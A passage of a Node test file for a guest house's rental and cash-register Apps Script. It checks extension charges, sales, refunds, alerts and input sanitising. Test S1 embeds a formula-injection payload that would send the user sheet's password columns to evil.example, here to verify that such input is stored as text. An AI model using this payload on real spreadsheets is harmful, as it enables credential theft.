// Fixes before going live (FIX-SPEC.md): business decisions 2, 4-12 and server fixes S1-S15.
// Run: node --test tests/
const test = require('node:test');
const assert = require('node:assert');
const { makeEnv } = require('./gas-shim');

const H = 3600000, DAY = 86400000, TZ = 8 * H; // reception time is UTC+8 (WITA)
const tsAt = ms => new Date(ms + TZ).toISOString().replace(/\D/g, '').slice(0, 17);
const ENTRIES_HEAD = ['Date', 'Category', 'Sub-category', 'object', 'Qty', 'Auto price per unit', 'Auto price', 'Real price (if different)', 'Author', 'Theorical cost per unit', 'Theorical cost', 'Real cost (if different)', 'Guest', 'Payment Type', 'Time stamp', 'month correction', 'Comment', 'Pouchnation time', 'Status', 'Seller'];
const MANUAL_HEAD = ['', 'Category', 'Sub-category', 'object', 'Qty', 'Auto price per unit', 'Auto price', 'Real price (if different)', 'Author', 'Theorical cost per unit', 'Theorical cost', 'Real cost (if different)', 'Guest', 'Payment Type', 'Author', 'Comment', 'Time stamp', 'Seller'];
const DA = [
  ['Activity', 'Selling Price', 'Purchase prices', '', '', '', '', '', '', '', 'Staff', 'Service', 'Transport', 'Tour', 'Other', 'Paid', 'Payment type'],
  ['Snorkeling Mask', '30,000Rp', '', '', '', '', '', '', '', '', '', 'Snorkeling Mask', '', '-Sunset Boat', 'Restaurant', '', 'Cash'],
  ['Rabbit bike', '50,000Rp', '', '', '', '', '', '', '', '', '', 'Rabbit bike', '', '', '', '', 'Unpaid'],
  ['Towel', '50,000Rp', '', '', '', '', '', '', '', '', '', 'Towel'],
];
const CASH = [['Column 1', 'Time ', 'Cashout', 'Difference', 'Cash in box', 'Change suply', 'Author', 'Comment', 'Type'], ['01/11/2026', '15:00:08', 0, 0, 1000000, '', 'r1@x', '', 'Closing']];
function sheets(sg) {
  const manual = [MANUAL_HEAD];
  for (let i = 0; i < 10; i++) manual.push(['', '', '', '', '', '=f', '=g', '', '', '=j', '=k']);
  if (!sg) { sg = [['Num', 'Status', 'Last guest ', 'Last Time ', 'Num Days', 'Back Before']]; for (let i = 1; i <= 6; i++) sg.push(['SG00' + i, 'OK', '', '', '', '']); sg.push(['B1', 'OK', '', '', '', '']); }
  return { 'Cashouts&Cor': CASH.map(r => r.slice()), 'Entries': [ENTRIES_HEAD], 'Entries Manual': manual, 'Data activities': DA, 'SG': sg,
    '24datafeed': [['Guest Name', 'First Name', 'Full']], 'New guest': [['', '', '', '', '', 'Bob']] };
}
function freshEnv(sg) {
  const env = makeEnv({ sheets: sheets(sg) });
  env.setupResult = env.ctx.UI_setup();
  const users = env.book['UI_Users'];
  users.appendRow(['ayu', 'Ayu', 'staff', 'r1@x', 'pw', '', '', '']);
  users.appendRow(['made', 'Made', 'gear', 'made@x', 'pw', '', '', '']);
  users.appendRow(['boss', 'Boss', 'manager', 'boss@x', 'pw', '', '', '']);
  return env;
}
const login = (env, u, extra = {}) => env.call({ action: 'login', username: u, password: 'pw', deviceId: 'dev-' + u, ...extra }).token;
let n = 0;
const op = (type, payload, at = new Date().toISOString()) => ({ id: 'op' + (++n) + '-' + Math.random(), type, at, payload });
const push = (env, token, ...ops) => env.call({ action: 'push', token, deviceId: 'dev', ops });
let clock = Date.now();
const newTs = (ms) => (ms ? tsAt(ms) : tsAt(clock = Math.max(Date.now(), clock + 1)));
const id = p => p + (++n) + 'abcdefg';
const pull = (env, token) => env.call({ action: 'pull', token });
const gearOf = (env, token) => pull(env, token).gear;
const item = (g, x) => g.items.find(i => i.id === x);
const gearLog = env => env.book['Gear_Log'].data.slice(1);
function openShift(env, token) { const r = push(env, token, op('shift_open', { shiftId: 'S' + (++n), cashCounted: 1000000 })); assert.strictEqual(r.results[0].status, 'applied', JSON.stringify(r)); }
function rentLine(guest, g, days = 1, extra = {}) {
  return { ts: newTs(), guest, category: 'Service', object: g.startsWith('B') ? 'Rabbit bike' : 'Snorkeling Mask', qty: days, unit: 30000, unitCost: 0, comment: g, gear: g, ...extra };
}
const rent = (env, token, guest, numbers, days = 1, payment = 'Unpaid') =>
  push(env, token, op('sale', { saleId: 'V' + n, payment, lines: numbers.map(g => rentLine(guest, g, days)) }));
/** Moves the return time of the current rental of a number (Gear_Log column F). */
const setBack = (env, num, ms) => env.book['Gear_Log'].data.forEach(r => { if (r[2] === 'out' && r[3] === num) r[5] = new Date(ms); });
/** hh:mm reception time, `d` days from today. */
const local = (d, hh, mm = 0) => { const day = new Date(Date.now() + TZ).toISOString().slice(0, 10); return Date.parse(day + 'T00:00:00Z') - TZ + d * DAY + hh * H + mm * 60000; };
const count = (env, made, seen = [], at) => push(env, made, op('gear_count', { cid: id('K'), items: seen.map(x => ({ item: x, condition: 'OK' })) }, at ? new Date(at).toISOString() : undefined)).results[0];

// ---------------- decision 5: extension only after an evening check ----------------
test('D5: no evening check after the return time → no extension; the server refuses to charge one', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  setBack(env, 'SG001', Date.now() - 3 * H);
  const g = gearOf(env, ayu);
  assert.strictEqual(item(g, 'SG001').lateDays, 0, 'overdue but not late');
  const r = push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG001', condition: 'OK', ext: { ts: newTs(), days: 1 } }] })).results[0];
  assert.strictEqual(r.status, 'applied');
  assert.strictEqual(r.charged, 0);
  assert.match(r.warning, /No extension for SG001/);
  assert.ok(!env.book['Entries'].data.some(l => /^Extension/.test(l[16] || '')));
});

test('D5: returned at 20:00 before the check → 0; one day per check day after the return time, at most one per day; capped', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001', 'SG002', 'SG003']);
  const back = local(-3, 18);
  ['SG001', 'SG002', 'SG003'].forEach(x => setBack(env, x, back));
  // SG001 handed back at 20:00 that day, the check is at 21:00 (pushed first: the server orders by time).
  count(env, made, [], local(-3, 21));
  count(env, made, [], local(-3, 21, 30)); // a second check the same evening counts once
  count(env, made, ['SG003'], local(-2, 21)); // SG003 was in the box at this check: not late that day
  count(env, made, [], local(-1, 21));
  const g = gearOf(env, ayu);
  assert.deepStrictEqual([item(g, 'SG001').lateDays, item(g, 'SG002').lateDays, item(g, 'SG003').lateDays], [3, 3, 2]);
  assert.deepStrictEqual(g.counts.map(c => c.at), [local(-3, 21), local(-3, 21, 30), local(-2, 21), local(-1, 21)].map(x => new Date(x).toISOString()));
  assert.deepStrictEqual(g.counts[2].seen, ['SG003']);
  let r = push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG001', condition: 'OK', ext: { ts: newTs(local(-3, 20)), days: 1 } }] }, new Date(local(-3, 20)).toISOString())).results[0];
  assert.strictEqual(r.charged, 0, 'back at 20:00, before the check');
  r = push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG002', condition: 'OK', ext: { ts: newTs(), days: 9 } },
    { item: 'SG003', condition: 'OK', ext: { ts: newTs() } }] })).results[0];
  assert.strictEqual(r.charged, 2);
  const ext = x => env.book['Entries'].data.find(l => l[16] === 'Extension ' + x);
  assert.strictEqual(ext('SG002')[4], 3, 'asked 9, the checks show 3');
  assert.strictEqual(ext('SG003')[4], 2, 'no days asked: the checks decide');
});

test('D5: gear staff return → returned_late only after a check, with the number of check days', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001', 'SG002']);
  setBack(env, 'SG001', local(-2, 18)); setBack(env, 'SG002', Date.now() - H);
  count(env, made, [], local(-2, 21));
  count(env, made, [], local(-1, 21));
  push(env, made, op('gear_return', { gid: id('G'), items: [{ item: 'SG001', condition: 'OK' }, { item: 'SG002', condition: 'OK' }] }));
  const g = gearOf(env, ayu);
  const late = g.diffs.filter(d => d.kind === 'returned_late');
  assert.deepStrictEqual(late.map(d => [d.item, d.late]), [['SG001', 2]], 'SG002 overdue but no check since: nothing to charge');
  const c = push(env, ayu, op('gear_confirm', { cfid: id('F'), diff: late[0].id, action: 'returned', ext: { ts: newTs() } })).results[0];
  assert.strictEqual(c.status, 'applied');
  assert.strictEqual(env.book['Entries'].data.find(l => l[16] === 'Extension SG001')[4], 2);
});

test('D5: counted in the box while recorded out: the desk cannot charge days for checks that saw it', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  setBack(env, 'SG001', local(-1, 18));
  count(env, made, ['SG001'], local(-1, 21));
  const df = gearOf(env, ayu).diffs.find(d => d.item === 'SG001' && d.kind === 'counted_but_out');
  const r = push(env, ayu, op('gear_confirm', { cfid: id('F'), diff: df.id, action: 'returned', ext: { ts: newTs(), days: 1 } })).results[0];
  assert.strictEqual(r.status, 'applied');
  assert.match(r.warning, /No extension/);
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').where, 'in');
});

// ---------------- decision 6: a sale always goes through ----------------
test('D6: selling a number recorded out (rental, volunteer, Sunset Boat) returns it first, via resold, no extension', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  setBack(env, 'SG001', local(-1, 18)); count(env, made, [], local(-1, 21)); // Ann is even late
  push(env, ayu, op('gear_out', { gid: id('G'), items: ['SG002'], guest: 'Volunteer' }));
  const trip = id('T');
  push(env, made, op('sunset_out', { trip, items: ['SG003'] }));
  const r = rent(env, ayu, 'Ben', ['SG001', 'SG002', 'SG003'], 2, 'Cash');
  assert.strictEqual(r.results[0].status, 'applied', JSON.stringify(r));
  const resold = gearLog(env).filter(x => x[2] === 'return' && JSON.parse(x[7]).via === 'resold');
  assert.deepStrictEqual(resold.map(x => x[3]), ['SG001', 'SG002', 'SG003']);
  assert.strictEqual(resold[0][4], 'Ann', 'returned for the previous guest');
  const g = gearOf(env, ayu);
  assert.ok(['SG001', 'SG002', 'SG003'].every(x => item(g, x).where === 'out' && item(g, x).last.guest === 'Ben'));
  assert.deepStrictEqual(g.diffs.filter(d => d.kind !== 'missing'), [], 'no difference (the others come from the check)');
  assert.ok(!env.book['Entries'].data.some(l => /^Extension/.test(l[16] || '')));
  assert.ok(gearOf(env, made).trips.every(t => t.trip !== trip || t.closed), 'the boat trip is over');
  push(env, made, op('sunset_back', { trip, items: ['SG003'] }));
  assert.strictEqual(item(gearOf(env, ayu), 'SG003').where, 'out', 'the boat return does not undo the new rental');
});

test('D6: unknown, out of service, wrong type or repeated number: the sale and the money pass, a sale_unlinked difference', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  push(env, ayu, op('gear_return', { gid: id('G'), items: [] }));
  push(env, made, op('gear_return', { gid: id('G'), items: [{ item: 'SG004', condition: 'Broken' }] })); // out of service
  const lines = [rentLine('Cy', 'SG999'), rentLine('Cy', 'SG004'), rentLine('Cy', 'B1', 1, { object: 'Snorkeling Mask' }), rentLine('Cy', 'SG005'), rentLine('Cy', 'SG005')];
  const r = push(env, ayu, op('sale', { saleId: 'V1', payment: 'Cash', lines }));
  assert.strictEqual(r.results[0].status, 'applied', JSON.stringify(r));
  assert.strictEqual(env.book['Entries'].data.length - 1, 5, 'all five lines are in the sheet');
  const g = gearOf(env, ayu);
  const un = g.diffs.filter(d => d.kind === 'sale_unlinked');
  assert.deepStrictEqual(un.map(d => [d.item, d.reason]), [['SG999', 'unknown'], ['SG004', 'unavailable'], ['B1', 'wrong_product'], ['SG005', 'duplicate']]);
  assert.strictEqual(un[0].saleTs, lines[0].ts);
  assert.strictEqual(un[0].guest, 'Cy');
  assert.strictEqual(un[0].object, 'Snorkeling Mask');
  assert.strictEqual(item(g, 'SG005').where, 'out', 'the first SG005 line is linked');
  assert.strictEqual(item(g, 'B1').where, 'in');
  assert.strictEqual(item(g, 'SG004').where, 'in');
  assert.ok(gearOf(env, made).diffs.some(d => d.kind === 'sale_unlinked'), 'the gear staff check it too');
  assert.strictEqual(push(env, ayu, op('gear_lost', { lid: id('L'), diff: un[0].id })).results[0].error, 'bad_payload');
  // Both sides confirm: closed.
  push(env, ayu, op('gear_confirm', { cfid: id('F'), diff: un[0].id, action: 'checked' }));
  push(env, made, op('gear_confirm', { cfid: id('F'), diff: un[0].id, action: 'checked' }));
  assert.ok(!gearOf(env, ayu).diffs.some(d => d.id === un[0].id));
  // Retry of the same sale writes nothing twice.
  const again = env.call({ action: 'push', token: ayu, deviceId: 'dev', ops: [{ ...op('sale', { saleId: 'V1', payment: 'Cash', lines }), id: 'retry-' + n }] });
  assert.strictEqual(again.results[0].status, 'applied');
  assert.strictEqual(gearLog(env).filter(x => x[2] === 'diff' && JSON.parse(x[7]).kind === 'sale_unlinked').length, 4);
});

// ---------------- decision 7: lists are never refused as a whole ----------------
test('D7: desk return, volunteer and gear staff return skip numbers already back, unavailable or unknown', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001', 'SG002']);
  let r = push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG001', condition: 'OK' }, { item: 'SG003', condition: 'OK' }, { item: 'SG999', condition: 'OK' }] })).results[0];
  assert.strictEqual(r.status, 'applied', JSON.stringify(r));
  assert.strictEqual(r.returned, 1);
  assert.deepStrictEqual(r.skipped, ['SG003', 'SG999']);
  r = push(env, ayu, op('gear_out', { gid: id('G'), items: ['SG003', 'SG002', 'nope'], guest: 'Volunteer' })).results[0];
  assert.strictEqual(r.status, 'applied', JSON.stringify(r));
  assert.strictEqual(r.out, 1);
  assert.deepStrictEqual(r.skipped, ['SG002', 'nope']);
  r = push(env, made, op('gear_return', { gid: id('G'), items: [{ item: 'SG002', condition: 'OK' }, { item: 'ZZ9', condition: 'OK' }] })).results[0];
  assert.strictEqual(r.status, 'applied');
  assert.deepStrictEqual(r.skipped, ['ZZ9']);
  const g = gearOf(env, ayu);
  assert.deepStrictEqual(['SG001', 'SG002', 'SG003'].map(x => item(g, x).where), ['in', 'in', 'out']);
});

// ---------------- decision 8: a paid rental keeps its number ----------------
test('D8: settle gives the line a new id: relink in Gear_Log, then line_update / line_delete act on the number', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const lines = [rentLine('Ann', 'SG001')];
  push(env, ayu, op('sale', { saleId: 'V', payment: 'Unpaid', lines }));
  const nts = newTs();
  const s = op('settle', { payment: 'Cash', items: [{ oldTs: lines[0].ts, newTs: nts }] });
  assert.strictEqual(push(env, ayu, s).results[0].status, 'applied');
  const rl = gearLog(env).filter(x => x[2] === 'relink');
  assert.strictEqual(rl.length, 1);
  assert.deepStrictEqual(JSON.parse(rl[0][7]), { from: lines[0].ts, to: nts });
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').last.saleTs, nts);
  const before = Date.parse(item(gearOf(env, ayu), 'SG001').back);
  assert.strictEqual(push(env, ayu, op('line_update', { ts: nts, qty: 3 })).results[0].status, 'applied');
  assert.strictEqual(Date.parse(item(gearOf(env, ayu), 'SG001').back) - before, 2 * DAY);
  assert.strictEqual(push(env, ayu, op('line_delete', { ts: nts })).results[0].status, 'applied');
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').where, 'in');
});

// ---------------- decision 9: refunds and cash rights ----------------
test('D9: staff refund, settle and expense only during their own open shift; a manager at any time', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), boss = login(env, 'boss');
  const ts = newTs();
  push(env, ayu, op('sale', { saleId: 'x', payment: 'Cash', lines: [{ ts, guest: 'Zed', category: 'Service', object: 'Towel', qty: 1, unit: 50000, unitCost: 0 }] }));
  const u = newTs();
  push(env, ayu, op('sale', { saleId: 'y', payment: 'Unpaid', lines: [{ ts: u, guest: 'Zed', category: 'Service', object: 'Towel', qty: 1, unit: 50000, unitCost: 0 }] }));
  assert.strictEqual(push(env, ayu, op('refund', { origTs: ts, newTs: newTs(), payment: 'Cash', amount: 50000 })).results[0].error, 'forbidden');
  assert.strictEqual(push(env, ayu, op('settle', { payment: 'Cash', items: [{ oldTs: u, newTs: newTs() }] })).results[0].error, 'forbidden');
  assert.strictEqual(push(env, ayu, op('expense', { ts: newTs(), object: 'Restaurant', amount: 1000, payment: 'Cash' })).results[0].error, 'forbidden');
  assert.strictEqual(push(env, boss, op('refund', { origTs: ts, newTs: newTs(), payment: 'Cash', amount: 10000 })).results[0].status, 'applied', 'manager, no shift');
  openShift(env, ayu);
  assert.strictEqual(push(env, ayu, op('settle', { payment: 'Cash', items: [{ oldTs: u, newTs: newTs() }] })).results[0].status, 'applied');
  assert.strictEqual(push(env, ayu, op('expense', { ts: newTs(), object: 'Restaurant', amount: 1000, payment: 'Cash' })).results[0].status, 'applied');
});

// ---------------- decision 10: 21:30 reminder ----------------
test('D10: UI_setup installs one daily 21:30 WITA trigger; it emails once when the check is not done', () => {
  const env = freshEnv();
  assert.deepStrictEqual(env.triggers.map(t => [t.fn, t.hour, t.minute, t.every, t.tz]), [['UI_eveningCheck', 21, 30, 1, 'Asia/Makassar']]);
  env.ctx.UI_setup();
  assert.strictEqual(env.triggers.length, 1, 'not duplicated');
  assert.strictEqual(env.ctx.UI_eveningCheck(), 'sent');
  assert.strictEqual(env.mails.length, 1);
  assert.deepStrictEqual(env.mails[0].to.split(', ').sort(), ['rabbittree.system.alerts.com@gmail.com', 'sebien.legoff@gmail.com', 'therabbittreemanager@gmail.com']);
  assert.match(env.mails[0].subject, /evening check not done/);
  assert.strictEqual(env.ctx.UI_eveningCheck(), 'already sent');
  assert.strictEqual(env.mails.length, 1, 'once a day');
  const env2 = freshEnv();
  count(env2, login(env2, 'made'), []);
  assert.strictEqual(env2.ctx.UI_eveningCheck(), 'done');
  assert.strictEqual(env2.mails.length, 0);
});

// ---------------- decision 11: shift close alert ----------------
test('D11: closing with a cash difference or open phantom cash emails manager, owner and alerts; never blocks', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu');
  const close = (counted, at) => push(env, ayu, op('shift_close', { shiftId: env.book['UI_Shifts'].data.at(-1)[0], cashCounted: counted, expectedCash: 1000000 }, at)).results[0];
  openShift(env, ayu);
  let r = close(1000000);
  assert.strictEqual(r.status, 'applied');
  assert.strictEqual(env.mails.length, 0, 'all good: no email');
  openShift(env, ayu);
  r = close(990000);
  assert.strictEqual(r.difference, -10000);
  assert.strictEqual(env.mails.length, 1);
  assert.deepStrictEqual(env.mails[0].to.split(', ').sort(), ['rabbittree.system.alerts.com@gmail.com', 'sebien.legoff@gmail.com', 'therabbittreemanager@gmail.com']);
  assert.match(env.mails[0].body, /Expected cash \(sheet\): 1000000[\s\S]*Counted: 990000[\s\S]*Difference[^\n]*-10000[\s\S]*not solved: none/);
  openShift(env, ayu);
  push(env, ayu, op('phantom', { pid: 'P' + id('x'), notReceived: 20000, comment: 'Ann owes the laundry' }));
  env.mailFail.next = true;
  r = close(980000, new Date(Date.now() + 2000).toISOString());
  assert.strictEqual(r.status, 'applied', 'a mail failure never blocks the close');
  assert.strictEqual(r.difference, 0);
  assert.match(r.warning, /not sent/);
  openShift(env, ayu);
  r = close(980000, new Date(Date.now() + 4000).toISOString());
  assert.strictEqual(r.status, 'applied');
  assert.match(env.mails.at(-1).body, /- .* -20000 by r1@x: Ann owes the laundry/);
});

// ---------------- decisions 2, 4, 12 ----------------
test('D2/S5: the registered computer only receives the password hashes of active staff', () => {
  const env = freshEnv();
  const reg = env.call({ action: 'login', username: 'boss', password: 'pw', deviceId: 'pc', registerDevice: true });
  const p = pull(env, reg.token);
  assert.deepStrictEqual(p.users.map(u => [u.username, u.role]), [['ayu', 'staff']]);
});

test('D4: default gear prices of a new Gear_Settings tab', () => {
  const env = makeEnv({ sheets: sheets() });
  env.ctx.UI_setup();
  const rows = Object.fromEntries(env.book['Gear_Settings'].data.slice(1).map(r => [r[0], r[1]]));
  assert.deepStrictEqual([rows['Snorkel'], rows['Mask (without snorkel)'], rows['Ring'], rows['Full snorkeling set (lost)'], rows['Bike — repair'],
    rows['Extension per day — mask'], rows['Extension per day — bike'], rows['Manager WhatsApp']], [50000, 100000, 15000, 150000, '', 30000, 50000, '']);
  // An existing tab is never rewritten.
  env.book['Gear_Settings'].data[1][1] = 1;
  env.ctx.UI_setup();
  assert.strictEqual(env.book['Gear_Settings'].data[1][1], 1);
});

test('D12: Entries dates are real dates shown dd/MM/yyyy, like Entries Manual', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  const e = env.book['Entries'];
  assert.ok(e.data[1][0] instanceof Date);
  assert.ok(e.formats.some(([r, c, f]) => r === 2 && c === 1 && f === 'dd/MM/yyyy'));
  assert.ok(!e.formats.some(([, , f]) => f === 'yyyy-mm-dd'));
});

// ---------------- S1 / S2: no formula from typed text ----------------
test('S1: device text never becomes a formula in UI_Log, UI_Shifts and Cashouts&Cor', () => {
  const env = freshEnv();
  const t = login(env, 'ayu');
  const F = '=IMPORTDATA("https://evil.example/?"&JOIN(",",UI_Users!F2:G9))';
  const r = env.call({ action: 'push', token: t, deviceId: F, ops: [{ id: 'o1', type: 'shift_open', at: new Date().toISOString(), payload: { shiftId: F, cashCounted: 1, comment: F } }] });
  assert.strictEqual(r.results[0].status, 'applied');
  const log = env.book['UI_Log'], sh = env.book['UI_Shifts'], cash = env.book['Cashouts&Cor'];
  for (let c = 3; c <= 10; c++) assert.notStrictEqual(log.kind(2, c), 'formula', 'UI_Log column ' + c);
  assert.strictEqual(sh.kind(2, 1), 'text');
  assert.strictEqual(sh.kind(2, 13), 'text');
  assert.notStrictEqual(cash.kind(cash.getLastRow(), 8), 'formula');
  const g = login(env, 'made');
  const r2 = env.call({ action: 'push', token: g, deviceId: 'g', ops: [{ id: 'o2', type: F, at: '+1', payload: {} }] });
  assert.strictEqual(r2.results[0].status, 'rejected');
  assert.notStrictEqual(log.kind(3, 5), 'formula');
  assert.notStrictEqual(log.kind(3, 7), 'formula');
  assert.ok(log.formats.some(([r, c, f]) => r === 1 && c === 3 && f === '@'), 'UI_Log C:J is text');
  const r3 = env.call({ action: 'push', token: t, deviceId: 'd', ops: [{ id: '=1+1', type: 'shift_open', at: new Date().toISOString(), payload: {} }] });
  assert.strictEqual(r3.results[0].error, 'bad_op');
});

test('S2: a comment "+62 812…" stays text after settle and line_update rewrite it', () => {
  const env = freshEnv();
  const boss = login(env, 'boss');
  const ts = newTs(), ts2 = newTs();
  push(env, boss, op('sale', { saleId: 'z', payment: 'Unpaid', lines: [{ ts, guest: '+Ann', category: 'Service', object: 'Towel', qty: 1, unit: 50000, comment: '+62 812 555 call her' }] }));
  const E = env.book['Entries'], M = env.book['Entries Manual'];
  assert.strictEqual(E.kind(2, 17), 'text');
  assert.strictEqual(push(env, boss, op('settle', { payment: 'Cash', items: [{ oldTs: ts, newTs: ts2 }] })).results[0].status, 'applied');
  assert.strictEqual(M.kind(2, 16), 'text', 'Manual comment rewritten by settle');
  assert.strictEqual(push(env, boss, op('line_update', { ts: ts2, payment: 'Cash' })).results[0].status, 'applied');
  assert.strictEqual(E.kind(2, 17), 'text');
  assert.strictEqual(E.kind(2, 13), 'text', 'guest');
  assert.strictEqual(M.kind(2, 16), 'text');
  assert.strictEqual(M.kind(2, 13), 'text');
});

// ---------------- S3: bad data rejected, time budget ----------------
test('S3: bad data or a missing sheet rejects that op only; the queue goes on', () => {
  const env = freshEnv();
  const boss = login(env, 'boss');
  const bad = op('sale', { payment: 'Cash', lines: [null] });
  const bad2 = op('settle', { payment: 'Cash', items: [null] });
  const card = op('card_settlement', { cid: id('C'), s1: 1 }); // no Settlements sheet here
  const ok = op('shift_open', { shiftId: 'S9', cashCounted: 1 });
  const r = push(env, boss, bad, bad2, card, ok);
  assert.ok(!r.partial, JSON.stringify(r));
  assert.deepStrictEqual(r.results.map(x => [x.status, x.error]), [['rejected', 'bad_payload'], ['rejected', 'bad_payload'], ['rejected', 'missing_sheet'], ['applied', undefined]]);
  assert.match(r.results[2].message, /Settlements/);
  assert.strictEqual(push(env, boss, bad).results[0].status, 'rejected', 'same answer on a resend');
  // A Google failure is still temporary.
  env.book['UI_Shifts'].failNext = 'setValues';
  const c = push(env, boss, op('shift_close', { shiftId: 'S9', cashCounted: 1, expectedCash: 1 }));
  assert.ok(c.partial);
});

test('S3: past the 18 s budget the push stops cleanly; the rest is partial and retried', () => {
  const env = freshEnv();
  const boss = login(env, 'boss');
  const ops = [];
  for (let i = 0; i < 10; i++) ops.push(op('phantom', { pid: 'P' + id('b'), notGiven: 1000, comment: 'x' + i }));
  const real = Date.now, base = real();
  let calls = 0;
  Date.now = () => base + (calls++) * 2000;
  let r;
  try { r = push(env, boss, ...ops); } finally { Date.now = real; }
  assert.ok(r.partial);
  assert.strictEqual(r.budget, true, 'the device sends the rest at once, without counting a failure');
  assert.ok(r.results.length >= 1 && r.results.length < 10, String(r.results.length));
  assert.strictEqual(env.book['UI_Log'].getLastRow() - 1, r.results.length, 'only what was done is logged');
  const r2 = push(env, boss, ...ops);
  assert.ok(!r2.partial);
  assert.strictEqual(r2.results.filter(x => x.status === 'applied').length, 10 - r.results.length);
});

// ---------------- S4, S6, S8, S9 ----------------
test('S4: a new sheet starts its state version at 1000000, kept by later setups', () => {
  const env = freshEnv();
  assert.strictEqual(env.props.UI_V, '1000000');
  assert.ok(pull(env, login(env, 'ayu')).shift.v >= 1000000);
  env.props.UI_V = '1000005';
  env.ctx.UI_setup();
  assert.strictEqual(env.props.UI_V, '1000005');
});

test('S6: a device clock up to 10 minutes ahead is accepted, more is refused', () => {
  const env = freshEnv();
  const boss = login(env, 'boss');
  assert.strictEqual(push(env, boss, op('shift_open', { shiftId: 'S1', cashCounted: 1 }, new Date(Date.now() + 15 * 60000).toISOString())).results[0].error, 'bad_time');
  assert.strictEqual(push(env, boss, op('shift_open', { shiftId: 'S1', cashCounted: 1 }, new Date(Date.now() + 5 * 60000).toISOString())).results[0].status, 'applied');
});

test('S8: a Gear_Log row with an unreadable date is ignored', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001']);
  env.book['Gear_Log'].data.push(['yesterday?', 'x1', 'return', 'SG001', '', '', 'someone', '{}'], ['', '', 'note', '', '', '', '', '']);
  const p = pull(env, ayu);
  assert.ok(p.ok, JSON.stringify(p));
  assert.strictEqual(item(p.gear, 'SG001').where, 'out');
});

test('S9: numbers of the old SG list in another format are reported by setup, not dropped silently', () => {
  const sg = [['Num', 'Status'], ['SG001', 'OK'], ['SG 2', 'Out'], ['12', 'In'], ['sg003', 'OK']];
  const env = makeEnv({ sheets: sheets(sg) });
  const res = env.ctx.UI_setup();
  assert.match(res, /NOT imported.*SG 2, 12/);
  assert.deepStrictEqual(env.book['SG'].data.slice(1).map(r => r[0]), ['SG001', 'SG003']);
});

// ---------------- S10, S11, S12, S13 ----------------
test('S10: returned as Lost, the number stays out of service', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'), made = login(env, 'made'); openShift(env, ayu);
  rent(env, ayu, 'Ann', ['SG001', 'SG002']);
  push(env, ayu, op('gear_return', { gid: id('G'), items: [{ item: 'SG001', condition: 'Lost' }] }));
  push(env, made, op('gear_return', { gid: id('G'), items: [{ item: 'SG002', condition: 'Lost' }] }));
  const g = gearOf(env, ayu);
  assert.deepStrictEqual(['SG001', 'SG002'].map(x => [item(g, x).where, item(g, x).condition]), [['lost', 'Lost'], ['lost', 'Lost']]);
  assert.ok(gearOf(env, made).unavailable.includes('SG001'));
  assert.strictEqual(env.book['SG'].data[1][3], 'Lost');
  push(env, ayu, op('gear_service', { sid: id('R'), item: 'SG001' }));
  assert.strictEqual(item(gearOf(env, ayu), 'SG001').where, 'in', 'replaced: back in stock');
});

test('S11: rental days are a whole number of 1 or more', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  let r = push(env, ayu, op('sale', { saleId: 'h', payment: 'Cash', lines: [rentLine('Ann', 'SG001', 1.5)] })).results[0];
  assert.strictEqual(r.error, 'bad_amount');
  assert.match(r.message, /whole number/);
  r = push(env, ayu, op('sale', { saleId: 'h2', payment: 'Cash', lines: [{ ts: newTs(), guest: 'Ann', category: 'Service', object: 'Snorkeling Mask', qty: 0.5, unit: 30000 }] })).results[0];
  assert.strictEqual(r.error, 'bad_amount', 'a rental product without a number too');
  const l = rentLine('Ann', 'SG001', 2);
  assert.strictEqual(push(env, ayu, op('sale', { saleId: 'h3', payment: 'Cash', lines: [l] })).results[0].status, 'applied');
  assert.strictEqual(push(env, ayu, op('line_update', { ts: l.ts, qty: 2.5 })).results[0].error, 'bad_amount');
  assert.strictEqual(push(env, ayu, op('sale', { saleId: 'h4', payment: 'Cash', lines: [{ ts: newTs(), guest: 'Ann', category: 'Service', object: 'Towel', qty: 0.5, unit: 30000 }] })).results[0].status, 'applied', 'other products unchanged');
});

test('S12: a negative expected cash on the screen is accepted', () => {
  const env = freshEnv();
  const ayu = login(env, 'ayu'); openShift(env, ayu);
  const r = push(env, ayu, op('shift_close', { shiftId: env.book['UI_Shifts'].data.at(-1)[0], cashCounted: 0, expectedCash: -5000 })).results[0];
  assert.strictEqual(r.status, 'applied', JSON.stringify(r));
});

test('S13: manager WhatsApp from B, else C; first with 8 digits; 0812… and a number that lost its 0 become 62812…', () => {
  const cases = [[['', '+62 812 3456 7890'], '+6281234567890'], [['0812 3456 789', ''], '+628123456789'], [[81234567890, ''], '+6281234567890'],
    [['123', '+62 812 000 111'], '+62812000111'], [['+62 811 222 333', '0899 999 999'], '+62811222333'], [['', 'see manager'], '']];
  for (const [[b, c], want] of cases) {
